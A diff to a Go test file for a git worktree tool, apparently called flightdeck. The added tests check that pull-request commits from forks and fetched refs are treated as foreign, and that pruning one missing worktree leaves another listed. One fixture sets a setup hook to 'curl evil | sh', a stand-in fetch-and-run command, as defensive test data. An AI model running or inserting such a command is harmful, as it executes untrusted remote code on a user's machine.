@@ -258,6 +258,69 @@ func TestCreateRemoteBranchAndForeign(t *testing.T) {
 	}
 }
 
+// TestForeignPullRequestPaths: the usual ways a pull request reaches a checkout all count as
+// foreign, and a commit on the project's remote counts as its own however it is named.
+func TestForeignPullRequestPaths(t *testing.T) {
+	f := newFixture(t)
+	origin := f.remote("origin")
+	f.remote("fork")
+	identity := "file://" + origin
+	// A commit only the fork has.
+	f.git(f.repo, "checkout", "-q", "-b", "tmp")
+	f.write(f.repo, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
+	f.git(f.repo, "add", "flightdeck.json")
+	f.git(f.repo, "commit", "-q", "-m", "pr")
+	pr := f.git(f.repo, "rev-parse", "HEAD")
+	f.git(f.repo, "push", "-q", "fork", "tmp:patch")
+	f.git(f.repo, "checkout", "-q", "main")
+	f.git(f.repo, "branch", "-D", "tmp")
+	f.git(f.repo, "fetch", "-q", "--all")
+	own := f.git(f.repo, "rev-parse", "origin/main")
+
+	foreign := func(name string, o CreateOptions) {
+		t.Helper()
+		o.Remote = identity
+		c, err := f.create(o)
+		if err != nil {
+			t.Fatalf("%s: %v", name, err)
+		}
+		if c.Foreign == "" {
+			t.Errorf("%s: counted as the project's own", name)
+		}
+	}
+	// gh pr checkout: a local branch that follows refs/pull/N/head of origin.
+	f.git(f.repo, "branch", "gh-7", pr)
+	f.git(f.repo, "config", "branch.gh-7.remote", "origin")
+	f.git(f.repo, "config", "branch.gh-7.merge", "refs/pull/7/head")
+	foreign("gh pr checkout", CreateOptions{Branch: "gh-7"})
+	// gh pr checkout of a fork's PR: the branch follows the fork's URL.
+	f.git(f.repo, "branch", "gh-8", own)
+	f.git(f.repo, "config", "branch.gh-8.remote", "https://example.com/someone/app.git")
+	f.git(f.repo, "config", "branch.gh-8.merge", "refs/heads/patch")
+	foreign("a branch that follows another URL", CreateOptions{Branch: "gh-8"})
+	// git fetch origin pull/7/head:pr-7, then the branch with no upstream.
+	f.git(f.repo, "branch", "pr-7", pr)
+	foreign("a fetched pull request branch", CreateOptions{Branch: "pr-7"})
+	// The commit named without a ref name.
+	f.git(f.repo, "fetch", "-q", "fork", "patch")
+	foreign("FETCH_HEAD", CreateOptions{Branch: "b1", Base: "FETCH_HEAD"})
+	foreign("a commit id", CreateOptions{Branch: "b2", Base: pr})
+	foreign("^{commit}", CreateOptions{Branch: "b3", Base: "fork/patch^{commit}"})
+	foreign("~0", CreateOptions{Branch: "b4", Base: "fork/patch~0"})
+
+	for name, o := range map[string]CreateOptions{
+		"origin's commit by id": {Branch: "o1", Base: own},
+		"origin/main":           {Branch: "o2", Base: "origin/main"},
+		"HEAD on origin":        {Branch: "o3"},
+	} {
+		o.Remote = identity
+		c, err := f.create(o)
+		if err != nil || c.Foreign != "" {
+			t.Errorf("%s: %+v %v", name, c, err)
+		}
+	}
+}
+
 func TestIncludeCopies(t *testing.T) {
 	f := newFixture(t)
 	f.write(f.repo, ".gitignore", ".env\nconfig/*.local.json\nbuild/\n")
@@ -502,6 +565,20 @@ func TestRemoveLockedAndGone(t *testing.T) {
 	if err := os.RemoveAll(b.Worktree.Path); err != nil {
 		t.Fatal(err)
 	}
+	// Another worktree whose folder is gone too, say on a volume not mounted now: removing one
+	// entry leaves it listed.
+	o, err := f.create(CreateOptions{Branch: "unmounted"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.RemoveAll(o.Worktree.Path); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		if _, err := f.g.Find(ctx, f.repo, o.Worktree.Path); err != nil {
+			t.Error("removing one gone worktree pruned another")
+		}
+	})
 	w, err := f.g.CheckRemove(ctx, f.repo, b.Worktree.Path, false)
 	if err != nil {
 		t.Fatal(err)
